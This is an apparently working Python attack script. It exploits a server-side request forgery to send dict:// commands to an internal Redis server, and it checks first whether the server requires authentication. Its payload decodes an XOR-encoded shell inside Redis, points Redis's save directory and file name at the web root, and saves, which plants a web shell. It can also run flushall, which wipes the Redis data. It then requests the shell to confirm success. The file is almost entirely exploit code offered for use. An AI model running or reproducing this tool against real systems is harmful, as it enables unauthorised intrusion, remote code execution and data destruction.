import requests
import time
import config


def dictgetshell(url):
    print("[info] dict write shell,ssrf url:{} rhost:{} rpot:{} dirpath:{} shellname:{}".format(url,config.RHOST,config.RPORT,config.DIRPATH,config.SHELLNAME))
    payload = [r'''dict://{}:{}/set:c:"{}"'''.format(config.RHOST, config.RPORT, config.SHELL),
               '''dict://{}:{}/set:b:"{}"'''.format(config.RHOST, config.RPORT, config.XORKEY),
               '''dict://{}:{}/bitop:xor:a:b:c'''.format(config.RHOST, config.RPORT),
               '''dict://{}:{}/config:set:dir:{}'''.format(config.RHOST, config.RPORT,config.DIRPATH),
               '''dict://{}:{}/config:set:dbfilename:{}'''.format(config.RHOST, config.RPORT,config.SHELLNAME),
               '''dict://{}:{}/save'''.format(config.RHOST, config.RPORT)]

    if config.FLUSHALL=="yes":
        payload.insert(0,"dict://{}:{}/flushall".format(config.RHOST,config.RPORT))

    if config.bgsaveerror=="yes":
        payload.insert(0,'''dict://{}:{}/config:set:stop-writes-on-bgsave-error:no'''.format(config.RHOST, config.RPORT))

    try:
        test=requests.get(url="{}dict://{}:{}/info".format(url,config.RHOST,config.RPORT),headers={"user-agent":"py"},timeout=3)
        if "authentication required" in test.text.lower():
            print("[{}] Authentication required redis server:{}".format(time.strftime("%Y-%m-%d %H:%M:%S"),config.RHOST))
            exit()
    except Exception as r:
        print("Error:{}".format(r))
        exit()

    dtime = time.strftime("%Y-%m-%d %H:%M:%S")
    shellpath="{}http://{}:{}/{}".format(url,config.RHOST,config.RWEBPORT,config.SHELLNAME)
    for pay in payload:
        try:
            urls="{}{}".format(url,pay)
            rqt=requests.get(urls,headers={"user-agent":"py"},timeout=3)
            if "ok" in rqt.text.lower():
                print("[{}] command=>{} Sucess".format(dtime,pay))
            else:
                print("[{}] command=>{} Failure!".format(dtime,pay))
                exit()
        except Exception as r:
            print("Error:{}".format(r))
            exit()

    try:
        rqt=requests.get(url=shellpath,headers={"user-agent":"py"},timeout=3)
        if "redis-bits" in rqt.text:
            print("[{}] write shell sucess,url:{}".format(dtime,shellpath))
        else:
            print("[{}] request http failed,Please check manually:{}".format(dtime,shellpath))
    except Exception as r:
        print("Error:{}".format(r))
        exit()

if __name__ == '__main__':
    print("Redis Write Shell---->")
    dictgetshell(config.SSRFURL)